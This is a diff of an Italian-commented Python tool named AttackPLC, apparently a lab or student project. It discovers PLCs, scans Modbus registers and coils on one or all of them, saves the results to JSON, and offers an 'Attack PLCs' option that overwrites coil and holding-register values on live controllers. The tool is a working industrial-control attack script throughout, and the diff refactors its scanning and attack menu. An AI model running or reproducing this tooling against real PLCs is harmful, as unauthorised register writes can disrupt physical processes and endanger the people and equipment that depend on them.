@@ -42,14 +42,9 @@ class AttackPLC:
 
     Parametri:
     - mb: è il file descriptor della connessione Modbus
-    - single_plc: se False, legge 8 registri a partire da un
-    indirizzo predefinito 0 (quindi da %IX0.0 a %IX0.7).
-    Se True, legge 8 registri a partire da un indirizzo
-    specificato dall'utente (il numero dell'indirizzo è in base 8
-    e va convertito in decimale affiché Modbus riesca a leggerlo)
     """
 
-    def read_DiscreteInputRegisters(self, mb, single_plc=False):
+    def read_DiscreteInputRegisters(self, mb, single_plc='all', param_addr=''):
         # Dictionnary dove andrò a mettere i registri letti e i
         # relativi valori
         registri = {}
@@ -60,8 +55,8 @@ class AttackPLC:
         # indirizzo 0; se sto analizzando una specifica
         # PLC, chiedo all'utente il registro da cui vuole
         # recuperare i registri
-        if not single_plc:
-            starting_addr = 0
+        if not single_plc == 'single':
+            starting_addr = param_addr
         else:
             starting_addr = input("Address to read (0-99): ")
 
@@ -101,21 +96,20 @@ class AttackPLC:
 
     Parametri:
     - mb: è il file descriptor della connessione Modbus
-    - single_plc: se False, analizza il range predefinito
-    di indirizzi da %IW0 a %IW7; se True analizza un range
-    di registri definito dall'utente. Il range deve essere
-    composto da due valori (starting_addr, ending_addr)
-    divisi da un "-" e senza spazi
     """
 
-    def read_InputRegisters(self, mb):
+    def read_InputRegisters(self, mb, single_plc='all', param_addr=''):
         registri = {}
 
-        addr_range = input("Address range to read [0-1023]: ")
+        if not single_plc == 'single':
+            addr_range = param_addr
 
-        while int(addr_range.split('-')[1]) > 1023:
-            print("Invalid addresses!")
-            addr_range = input("Address range to read [0-1023]: ")
+        else:
+            addr_range = input("Input Registers. Enter address range [0-1023]: ")
+
+            while int(addr_range.split('-')[1]) > 1023:
+                print("Invalid addresses!")
+                addr_range = input("Input Registers. Enter address range [0-1023]: ")
 
         starting_addr = int(addr_range.split('-')[0])
         ending_addr = int(addr_range.split('-')[1])
@@ -135,19 +129,22 @@ class AttackPLC:
     Leggo gli Output e gli Holding Registers
     """
 
-    def read_HoldingOutputRegisters(self, mb):
+    def read_HoldingOutputRegisters(self, mb, single_plc='all', param_addr=''):
         registri = {}
 
-        addr_range = input("Address range to read [0-1023]]: ")
+        if not single_plc == 'single':
+            addr_range = param_addr
+        else:
+            addr_range = input("Holding Registers. Enter address range [0-1023]]: ")
 
-        while int(addr_range.split('-')[1]) > 1023:
-            print("Invalid addresses!")
-            addr_range = input("Address range to read [0-1023]: ")
+            while int(addr_range.split('-')[1]) > 1023:
+                print("Invalid addresses!")
+                addr_range = input("Holding Registers. Enter address range [0-1023]: ")
 
         starting_addr = int(addr_range.split('-')[0])
         ending_addr = int(addr_range.split('-')[1])
 
-        print(f"Reading Input Registers from %QW{starting_addr} to %QW{ending_addr}")
+        print(f"Reading Holding Registers from %QW{starting_addr} to %QW{ending_addr}")
         holdingRegisters = mb.read_holdingregisters(starting_addr, ending_addr)
 
         reg_num = starting_addr
@@ -162,14 +159,17 @@ class AttackPLC:
     Leggo le Coils
     """
 
-    def read_Coils(self, mb):
+    def read_Coils(self, mb, single_plc='all', param_addr=''):
         registri = {}
 
-        starting_addr = input("Enter addresses separated by comma (0-99): ")
+        if not single_plc == 'single':
+            starting_addr = param_addr
+        else:
+            starting_addr = input("Coils. Enter addresses separated by comma (0-99): ")
 
-        # while (int(starting_addr) > 99):
-        #  print("Invalid address!")
-        #  starting_addr = input("Enter addresses separated by comma (0-99): ")
+            # while (int(starting_addr) > 99):
+            #  print("Invalid address!")
+            #  starting_addr = input("Enter addresses separated by comma (0-99): ")
 
         starting_addr = starting_addr.split(',')
 
@@ -255,17 +255,10 @@ class AttackPLC:
     attive prima di procedere oltre: se una scansione precedente non è 
     stata trovata, chiedo all'utente se vuole eseguirne una.
 
-    Per default, in questa fase vengono analizzati:
-    - i discrete input registers %IX0.0-7
-    - gli input registers %IW0-7
-    - gli holding/output registers %QW0-9
-    - le coils %QX0.0-7
-
-    Per range personalizzati, si rimanda allo scan delle singole PLC.
     I risultati dello scan vengono salvati in un file .json
     """
 
-    def scan_plcs(self, single_plc='single'):
+    def scan_plcs(self, single_plc='all'):
         self.scan_is_present()
 
         # Leggo da file la lista delle PLC trovate in precedenza
@@ -276,6 +269,12 @@ class AttackPLC:
         plc_list = json.loads(buf)
 
         if not single_plc == 'single':
+            print("Scanning all PLCs\n")
+
+            req_di_registers = input("Discrete Input Registers. Enter address (0-99): ")
+            req_input_registers = input("Input Registers. Enter address range (0-1023): ")
+            req_holding_registers = input("Holding Registers. Enter address range (0-1023): ")
+            req_coils = input("Coils. Enter addresses separated by comma (0-99): ")
 
             # Analizzo le PLC una a una
             for plc in plc_list:
@@ -285,19 +284,19 @@ class AttackPLC:
                 mb.connect()
 
                 # Leggo i Discrete Input Registers
-                self.disInReg = self.read_DiscreteInputRegisters(mb, False)
+                self.disInReg = self.read_DiscreteInputRegisters(mb, 'all', req_di_registers)
                 print(self.disInReg)
 
                 """
                 Come prima, ma per tutti gli altri registri!
                 """
-                self.InReg = self.read_InputRegisters(mb)
+                self.InReg = self.read_InputRegisters(mb, 'all', req_input_registers)
                 print(self.InReg)
 
-                self.HolReg = self.read_HoldingOutputRegisters(mb)
+                self.HolReg = self.read_HoldingOutputRegisters(mb, 'all', req_holding_registers)
                 print(self.HolReg)
 
-                self.Coils = self.read_Coils(mb)
+                self.Coils = self.read_Coils(mb, 'all', req_coils)
                 print(self.Coils)
 
                 mb.close()
@@ -308,16 +307,14 @@ class AttackPLC:
                 self.plc_registers[plc_list[plc]]['HoldingOutputRegisters'] = self.HolReg
                 self.plc_registers[plc_list[plc]]['Coils'] = self.Coils
 
-                # print(plcs[plc])
-
-            # print(json.dumps(self.plc_registers, indent=4)) # Debug
-
             # Salvo il risultato della scansione su file
             with open('plc_registers.json', 'w') as pr:
                 pr.write(json.dumps(self.plc_registers, indent=4))
 
         else:
             plc = None
+
+            print("Scanning single PLC\n")
             print("Available PLCs: ")
             count = 1  # Contatore, serve solo per l'elenco delle plc
 
@@ -342,16 +339,16 @@ class AttackPLC:
             mb = ModbusClient(plc, 502)
             mb.connect()
 
-            self.disInReg = self.read_DiscreteInputRegisters(mb, True)
+            self.disInReg = self.read_DiscreteInputRegisters(mb, 'single')
             print(self.disInReg)
 
-            self.InReg = self.read_InputRegisters(mb)
+            self.InReg = self.read_InputRegisters(mb, 'single')
             print(self.InReg)
 
-            self.HolReg = self.read_HoldingOutputRegisters(mb)
+            self.HolReg = self.read_HoldingOutputRegisters(mb, 'single')
             print(self.HolReg)
 
-            self.Coils = self.read_Coils(mb)
+            self.Coils = self.read_Coils(mb, 'single')
             print(self.Coils)
 
             mb.close()
@@ -394,8 +391,8 @@ class AttackPLC:
     Cambio il valore di un registro sulla PLC
     """
 
-    def change_register_value(self, single_plc=False):
-        if not single_plc:
+    def change_register_value(self, single_plc='all'):
+        if not single_plc == 'single':
             self.scan_is_present()
 
             print("Available registers: ")
@@ -405,10 +402,10 @@ class AttackPLC:
             choice = input("What do you want to attack? [coil / register]: ")
 
             """
-            while(choice != "coil" or choice != "register"):
-            print(choice)
-            print("Invalid choice")
-            choice = input("What do you want to attack? [coil / register]: ")
+            while not choice == "coil" or not choice == "register":
+                print(choice)
+                print("Invalid choice")
+                choice = input("What do you want to attack? [coil / register]: ")
             """
 
             # Assumo che se faccio un attacco di massa su tutte
@@ -437,8 +434,7 @@ class AttackPLC:
 
                 # La scrittura posso farla solo su Holding/Output Registers e Coils...
                 if choice == "register":
-                    print(
-                        f"Value found during the previous scan: {plc_list[plc]['HoldingOutputRegisters']['%QW' + register]}")
+                    print(f"Value found during the previous scan: {plc_list[plc]['HoldingOutputRegisters']['%QW' + register]}")
                     actual_register_value = mb.read_holdingregisters(int(register), 1)
                     print(f"Current %QW{register} register value on PLC: {actual_register_value}. Writing new value ")
                 else:
@@ -470,7 +466,6 @@ class AttackPLC:
             print("Available PLCs from scan: ")
             counter = 1
             for i in plc_list:
-                # if(os.path.exists(f'{plc_list[plc]}.json')):
                 print(f'{counter} - {plc_list[i]}')
 
             choice = input("Select PLC: ")
@@ -490,9 +485,7 @@ class AttackPLC:
             for ip in plc_data:
                 plc = ip
 
-            print(plc)
-
-            print("Available registers and values: \n")
+            print(f"Available registers and values for {plc}: \n")
 
             for key, val in plc_data.items():
                 print("Reg     | val")
@@ -552,13 +545,6 @@ class AttackPLC:
         time.sleep(1)  # Altrimenti mi sballa la stampa in caso di thread
         input("Done. Presse Enter to continue: ")
 
-    """
-    Richiamo i tipi di attacco alle PLC
-    """
-
-    def attack_all_plc(self, mb, single_plc=False):
-        pass
-
 
 """
 Definisco il main. Che poi è il menu da cui richiamo
@@ -577,9 +563,8 @@ def main():
         print("1 - Find active PLCs")
         print("2 - Scan all PLCs registers")
         print("3 - Scan single PLC registers")
-        print("4 - Modify Registers")
-        print("5 - DoS Attack to a register")
-        print("6 - Exit\n")
+        print("4 - Attack PLCs")
+        print("5 - Exit\n")
         choice = input("Enter your choice: ")
 
         if choice == "1":
@@ -589,10 +574,8 @@ def main():
         elif choice == "3":
             ap.scan_plcs('single')
         elif choice == "4":
-            ap.change_register_value(True)
+            ap.change_register_value('single')
         elif choice == "5":
-            pass
-        elif choice == "6":
             os._exit(1)
         else:
             print("Invalid choice\n")
